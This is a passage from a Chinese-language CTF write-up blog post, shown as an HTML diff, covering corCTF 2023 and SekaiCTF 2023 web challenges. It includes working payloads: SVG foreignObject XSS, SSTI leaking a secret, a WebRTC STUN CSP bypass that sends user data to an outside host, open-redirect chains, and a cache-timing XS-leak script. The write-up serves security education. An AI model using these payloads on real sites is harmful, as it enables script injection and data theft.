@@ -1,0 +1,798 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top" lang="zh-tw">
+<head>
+    <meta charset="utf-8">
+<title>corCTF 2023 &amp; Sekai CTF 2023 筆記 - Huli&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+
+            
+<link href="https://blog.huli.tw/2023/09/02/en/corctf-sekaictf-2023-writeup/" rel="alternate" hreflang="en" />
+            
+    
+
+
+
+
+    
+<link rel="canonical" href="https://blog.huli.tw/2023/09/02/corctf-sekaictf-2023-writeup/">
+    
+
+
+
+
+
+    <meta name="description" content="這兩場都有稍微參加一下，但不是每一題都有看，這篇純粹做個筆記而已，稍微記一下解法，不會太詳細。 老樣子，筆記一下關鍵字：  GraphQL batch query + alias Python os.path.join 絕對路徑 Svg XSS, foreignObject WebRTC CSP bypass Status code xsleak DNS rebinding nmap comman">
+<meta property="og:type" content="article">
+<meta property="og:title" content="corCTF 2023 &amp; Sekai CTF 2023 筆記">
+<meta property="og:url" content="https://blog.huli.tw/2023/09/02/corctf-sekaictf-2023-writeup/index.html">
+<meta property="og:site_name" content="Huli&#39;s blog">
+<meta property="og:description" content="這兩場都有稍微參加一下，但不是每一題都有看，這篇純粹做個筆記而已，稍微記一下解法，不會太詳細。 老樣子，筆記一下關鍵字：  GraphQL batch query + alias Python os.path.join 絕對路徑 Svg XSS, foreignObject WebRTC CSP bypass Status code xsleak DNS rebinding nmap comman">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://blog.huli.tw/img/corctf-sekaictf-2023-writeup/cover.png">
+<meta property="article:published_time" content="2023-09-02T06:10:44.000Z">
+<meta property="article:modified_time" content="2023-09-02T06:17:28.454Z">
+<meta property="article:author" content="Huli">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.huli.tw/img/corctf-sekaictf-2023-writeup/cover.png">
+
+
+
+<link rel="alternative" href="/atom.xml" title="corCTF 2023 &amp; Sekai CTF 2023 筆記" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/img/lidemy_logo.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+
+
+<link rel="stylesheet" href="/css/bulma.css?v=2.css">
+
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />
+
+
+<link rel="stylesheet" href="/css/style.css?v=3.css">
+
+
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-1393J2EVCZ');
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <script>
+        if (localStorage.getItem('dark-mode')) {
+            if (localStorage.getItem('dark-mode') === 'true') {
+                document.body.classList.add('dark-mode')
+            }
+        } else {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                document.body.classList.add('dark-mode')
+            }
+        }
+    </script>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
+                
+                    
+                    Huli&#39;s blog
+                    
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/archives">文章列表</a>
+            
+            <a class="navbar-item "
+               href="/categories">分類</a>
+            
+            <a class="navbar-item "
+               href="/recommend">推薦閱讀</a>
+            
+            <a class="navbar-item "
+               href="/about">關於我</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="目錄">
+                    目錄
+                </a>
+                <div class="navbar-dropdown">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#corctf-2023">1&nbsp;&nbsp;<b>corCTF 2023</b></a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#force-118-solves">1.1&nbsp;&nbsp;force (118 solves)</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#msfrognymize-64-solves">1.2&nbsp;&nbsp;msfrognymize (64 solves)</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#frogshare-33-solves">1.3&nbsp;&nbsp;frogshare (33 solves)</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#youdirect-5-solves">1.4&nbsp;&nbsp;youdirect (5 solves)</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#crabspace-4-solves">1.5&nbsp;&nbsp;crabspace (4 solves)</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#leakynote-3-solves">1.6&nbsp;&nbsp;leakynote (3 solves)</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#pdf-pal-2-solves">1.7&nbsp;&nbsp;pdf-pal (2 solves)</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#lemon-csp-1-solve">1.8&nbsp;&nbsp;lemon-csp (1 solve)</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#0day-1-solve">1.9&nbsp;&nbsp;0day (1 solve)</a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#sekaictf-2023">2&nbsp;&nbsp;<b>SekaiCTF 2023</b></a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#scanner-service-146-solves">2.1&nbsp;&nbsp;Scanner Service (146 solves)</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#frog-waf-29-solves">2.2&nbsp;&nbsp;Frog-WAF (29 solves)</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#chunky-16-solves">2.3&nbsp;&nbsp;Chunky (16 solves)</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#golf-jail-16-solves">2.4&nbsp;&nbsp;Golf Jail (16 solves)</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#leakless-note-4-solves">2.5&nbsp;&nbsp;Leakless Note (4 solves)</a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" target="_blank" title="Medium" href="https://hulitw.medium.com/">
+                
+                <i class="fab fa-medium"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="Facebook" href="https://www.facebook.com/huli.blog">
+                
+                <i class="fab fa-facebook"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+               
+            
+            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
+                <div>
+                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
+                    <defs>
+                    </defs>
+                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
+                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
+                    </g>
+                    </svg>
+                </div>
+            </a>
+            
+                <a class="navbar-item" href="/2023/09/02/en/corctf-sekaictf-2023-writeup/">English</a>
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+      
+      <div data-nosnippet class="self-notice">
+        最近開了一個讀者回饋表單，無論是對文章的感想或是對部落格的感想，有什麼想回饋的都可以填表單跟我說：<a href="https://forms.gle/XuWyRC5qtSd2ANta8" target="_blank">表單連結</a>
+      </div>
+      
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            corCTF 2023 &amp; Sekai CTF 2023 筆記
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2023-09-02T06:10:44.000Z" itemprop="datePublished">2023年9月2日</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/Security/">Security</a>
+        </span>
+        
+        
+        
+    </div>
+    
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <p>這兩場都有稍微參加一下，但不是每一題都有看，這篇純粹做個筆記而已，稍微記一下解法，不會太詳細。</p>
+<p>老樣子，筆記一下關鍵字：</p>
+<ol>
+<li>GraphQL batch query + alias</li>
+<li>Python os.path.join 絕對路徑</li>
+<li>Svg XSS, foreignObject</li>
+<li>WebRTC CSP bypass</li>
+<li>Status code xsleak</li>
+<li>DNS rebinding</li>
+<li>nmap command injection</li>
+<li>ruby rack 上傳檔案暫存</li>
+<li>buildConstraintViolationWithTemplate EL injection</li>
+<li>request smuggling</li>
+<li>document.baseURI</li>
+<li>200&#x2F;404 status code xsleak</li>
+</ol>
+<span id="more"></span>
+
+<h2><span id="corctf-2023">corCTF 2023</span></h2><p>題目的原始碼都在這邊：<a target="_blank" rel="noopener" href="https://github.com/Crusaders-of-Rust/corCTF-2023-public-challenge-archive/tree/master/web">https://github.com/Crusaders-of-Rust/corCTF-2023-public-challenge-archive/tree/master/web</a><br>部分 web 題的 writeup：<a target="_blank" rel="noopener" href="https://brycec.me/posts/corctf_2023_challenges">https://brycec.me/posts/corctf_2023_challenges</a></p>
+<h3><span id="force-118-solves">force (118 solves)</span></h3><p>pin 碼的值有 10000 種可能，需要在 10 個 request 以內用 GraphQL query 找出正確的值。</p>
+<p>解法就是用 batch query + alias，一個請求就可以試很多次（取自底下的文章）：</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;
+  flag0:flag(pin:0),
+  flag1:flag(pin:1),
+  flag2:flag(pin:2),
+  flag3:flag(pin:3),
+  flag4:flag(pin:4),
+  flag5:flag(pin:5)
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其他人的 writeup：</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://siunam321.github.io/ctf/corCTF-2023/web/force/">https://siunam321.github.io/ctf/corCTF-2023/web/force/</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/hanzotaz/corctf2023_writeup/">https://github.com/hanzotaz/corctf2023_writeup/</a></li>
+</ol>
+<h3><span id="msfrognymize-64-solves">msfrognymize (64 solves)</span></h3><p>重點是底下這一段的程式碼：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/anonymized/&lt;image_file>'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">serve_image</span><span class="token punctuation">(</span>image_file<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">,</span> unquote<span class="token punctuation">(</span>image_file<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token string">".."</span> <span class="token keyword">in</span> file_path <span class="token keyword">or</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Image </span><span class="token interpolation"><span class="token punctuation">&#123;</span>file_path<span class="token punctuation">&#125;</span></span><span class="token string"> cannot be found."</span></span><span class="token punctuation">,</span> <span class="token number">404</span>
+    <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'image/png'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Python 的 <code>os.path.join</code> 有一個眾所皆知的行為是當你要 join 的東西是一個絕對路徑的時候，前面都會被忽略：</p>
+<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; os.path.join(&#39;&#x2F;tmp&#x2F;abc&#39;, &#39;test.txt&#39;)
+&#39;&#x2F;tmp&#x2F;abc&#x2F;test.txt&#39;
+&gt;&gt;&gt; os.path.join(&#39;&#x2F;tmp&#x2F;abc&#39;, &#39;&#x2F;test.txt&#39;)
+&#39;&#x2F;test.txt&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>因此這題利用這個特性就可以做到任意讀檔，拿到 flag。</p>
+<p>參考資料：<a target="_blank" rel="noopener" href="https://siunam321.github.io/ctf/corCTF-2023/web/msfrognymize/">https://siunam321.github.io/ctf/corCTF-2023/web/msfrognymize/</a></p>
+<h3><span id="frogshare-33-solves">frogshare (33 solves)</span></h3><p>這題使用了一個叫做 <a target="_blank" rel="noopener" href="https://github.com/shubhamjain/svg-loader">svg-loader</a> 的 library，可以自動載入一個 SVG URL，因此這題是基於 SVG 的 XSS。</p>
+<p>在引入的時候為了安全性，會自動把 script 以及 inline script 等等的東西移除，但是漏掉了 <code>&lt;foreignObject&gt;</code> 這個東西，這標籤可以讓你在 SVG 裡面載入 HTML，搭配 iframe srcdoc 來使用就可以繞過：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" standalone="no"?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">svg</span> <span class="token name">PUBLIC</span> <span class="token string">"-//W3C//DTD SVG 1.1//EN"</span> <span class="token string">"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.1<span class="token punctuation">"</span></span> <span class="token attr-name">baseProfile</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>full<span class="token punctuation">"</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/svg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>polygon</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>triangle<span class="token punctuation">"</span></span> <span class="token attr-name">points</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0,0 0,50 50,0<span class="token punctuation">"</span></span> <span class="token attr-name">fill</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#009900<span class="token punctuation">"</span></span> <span class="token attr-name">stroke</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#004400<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foreignObject</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>script<span class="token entity named-entity" title="&gt;">&amp;gt;</span>alert(document.domain)<span class="token entity named-entity" title="&lt;">&amp;lt;</span>/script<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foreignObject</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>再來就是繞過 CSP，這題最後是用 <code>&lt;base&gt;</code> 來改變 script 載入的位置來達成。</p>
+<p>參考資料：</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://siunam321.github.io/ctf/corCTF-2023/web/frogshare/">https://siunam321.github.io/ctf/corCTF-2023/web/frogshare/</a></li>
+</ol>
+<p>而 Renwa 的解法則是在 iframe 裡面重建 app，並藉由 Next.js 的特性來插入 script：<a target="_blank" rel="noopener" href="https://gist.github.com/RenwaX23/75f945e25123442ea341d855c22be9dd">https://gist.github.com/RenwaX23/75f945e25123442ea341d855c22be9dd</a></p>
+<h3><span id="youdirect-5-solves">youdirect (5 solves)</span></h3><p>這題就是找到 YouTube 上的 open redirect，簡單明瞭。</p>
+<p>@EhhThing 提供的（點了會登出），串了兩層 open redirect：</p>
+<p><a target="_blank" rel="noopener" href="https://youtube.com/logout?continue=http://googleads.g.doubleclick.net/pcs/click?adurl=https://webhook.site/ccb8a675-14cb-419c-9e85-3b709a99e394">https://youtube.com/logout?continue=http%3A%2F%2Fgoogleads%2Eg%2Edoubleclick%2Enet%2Fpcs%2Fclick%3Fadurl%3Dhttps%3A%2F%2Fwebhook%2Esite%2Fccb8a675%2D14cb%2D419c%2D9e85%2D3b709a99e394</a></p>
+<p>@pew 提供的：<br><a target="_blank" rel="noopener" href="https://www.youtube.com/attribution_link?u=https://m.youtube.com@pew.com/pew">https://www.youtube.com/attribution_link?u=https://m.youtube.com@pew.com/pew</a></p>
+<p>@Josh 提供的：<br><a target="_blank" rel="noopener" href="https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbC01MWUzXzV4RVhlVExyRmtlOFZ4Z05pekhaQXxBQ3Jtc0ttQVFnRno1TnpIRWQyb1lnMmhJYW12ZWFTMmIwQVdrcG01Y1A5eGV4REtUV0taTzZKTUdmcWFxN3lFczRNanZuZGNtNmtzOG1pdExoTzYtSE40dHRBa2otZ05kMjgwOHFEZFo3czRwU2dRQTFQekpQcw&q=https://sheiwknajaka.free.beeceptor.com/&v=-5Rm9ymMTRA&html_redirect=1">https://www.youtube.com/redirect?event=video_description&amp;redir_token=QUFFLUhqbC01MWUzXzV4RVhlVExyRmtlOFZ4Z05pekhaQXxBQ3Jtc0ttQVFnRno1TnpIRWQyb1lnMmhJYW12ZWFTMmIwQVdrcG01Y1A5eGV4REtUV0taTzZKTUdmcWFxN3lFczRNanZuZGNtNmtzOG1pdExoTzYtSE40dHRBa2otZ05kMjgwOHFEZFo3czRwU2dRQTFQekpQcw&amp;q=https%3A%2F%2Fsheiwknajaka.free.beeceptor.com%2F&amp;v=-5Rm9ymMTRA&amp;html_redirect=1</a></p>
+<p>這個比較特別，其實 YouTube 影片敘述的連結每一個都會產生一個 redirect link，但是在網頁上都有綁定 session ID，所以換個裝置就不能使用了，而這個是在 mobile app 上面產生的，可以是因為 mobile app 沒有 cookie 所以不受限制，有趣。</p>
+<h3><span id="crabspace-4-solves">crabspace (4 solves)</span></h3><p>第一步是用 tera 的 SSTI leak 出環境變數：<code>&#123;&#123; get_env(name="SECRET") &#125;&#125;</code></p>
+<p>再來可以用 WebRTC 去繞過 CSP：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    c<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token literal-property property">iceServers</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token literal-property property">urls</span><span class="token operator">:</span><span class="token string">"stun:&#123;&#123;user.id&#125;&#125;.x.cjxol.com:1337"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>
+    <span class="token punctuation">(</span>p<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">RTCPeerConnection</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">createDataChannel</span><span class="token punctuation">(</span><span class="token string">"d"</span><span class="token punctuation">)</span>
+    <span class="token keyword">await</span> p<span class="token punctuation">.</span><span class="token function">setLocalDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+<span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>有了這兩個之後就可以偽造出一個 admin session 然後拿到 flag。</p>
+<p>參考資料：</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://www.cjxol.com/posts/corctf-2023-crabspace-web-writeup/">corCTF 2023 web&#x2F;crabspace Writeup</a></li>
+</ol>
+<h3><span id="leakynote-3-solves">leakynote (3 solves)</span></h3><p>這題在比賽中的時候有解開，簡單來講就是給你一個 free HTML injection 以及嚴格的 CSP：</p>
+<pre class="line-numbers language-none"><code class="language-none">Content-Security-Policy &quot;script-src &#39;none&#39;; object-src &#39;none&#39;; frame-ancestors &#39;none&#39;;&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然後有一個 search API，成功會回傳 200，失敗回傳 404，要想辦法利用這個去 leak flag。</p>
+<p>這題的重點之一是 CSP header 是 nginx 加上的，而 nginx 只有對 2xx 跟 3xx 會加上 header，因此如果搜尋失敗回傳 404，這個頁面是不會有 CSP 的。</p>
+<p>因此我那時候就想出了一個用 cache probing 的方式。</p>
+<p>我們在 note 裡面插入 <code>&lt;iframe src=search?q=a&gt;</code>，如果沒有找到東西，那就沒有 CSP，所以 iframe 的內容會被載入，頁面上的 CSS 也會被載入。反之，因為違反 CSP，沒有東西會被載入。</p>
+<p>因此可以透過「CSS 有沒有被放到 cache 中」這點去 leak 出搜尋有沒有找到東西。</p>
+<p>那時候實作的程式碼如下：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+  <span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token parameter">ms</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span>
+  <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">clearCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">let</span> controller <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AbortController</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">let</span> signal <span class="token operator">=</span> controller<span class="token punctuation">.</span>signal<span class="token punctuation">;</span>
+    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://leakynote.be.ax/assets/normalize.css'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>
+      <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">"no-cors"</span><span class="token punctuation">,</span>
+      <span class="token literal-property property">signal</span><span class="token operator">:</span> signal<span class="token punctuation">,</span>
+      <span class="token literal-property property">cache</span><span class="token operator">:</span> <span class="token string">'reload'</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+    controller<span class="token punctuation">.</span><span class="token function">abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token parameter">title<span class="token punctuation">,</span> url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token comment">// open note page</span>
+    <span class="token keyword">var</span> w <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+
+    <span class="token comment">// wait 1s</span>
+    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>
+
+    <span class="token comment">// clear cache and wait again</span>
+    <span class="token keyword">await</span> <span class="token function">clearCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1500</span><span class="token punctuation">)</span>
+
+    <span class="token comment">// now the iframe should load, do cache probing</span>
+    <span class="token keyword">const</span> now <span class="token operator">=</span> performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://leakynote.be.ax/assets/normalize.css'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+      <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span><span class="token punctuation">,</span>
+      <span class="token literal-property property">cache</span><span class="token operator">:</span> <span class="token string">'force-cache'</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+    <span class="token keyword">const</span> end <span class="token operator">=</span> performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/report?title=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>title<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;ms=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>end<span class="token operator">-</span>now<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>end<span class="token operator">-</span>now <span class="token operator">>=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/maybe/'</span> <span class="token operator">+</span> title<span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token comment">// cached(no result) => 2~3ms</span>
+    <span class="token comment">// no cache(found) => 4.8~5.8ms</span>
+    w<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token comment">// copy paste the following from python script</span>
+  <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;a'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=c9193aee91b0fc29'</span><span class="token punctuation">)</span>
+<span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;c'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=9f2d1bd495927bc2'</span><span class="token punctuation">)</span>
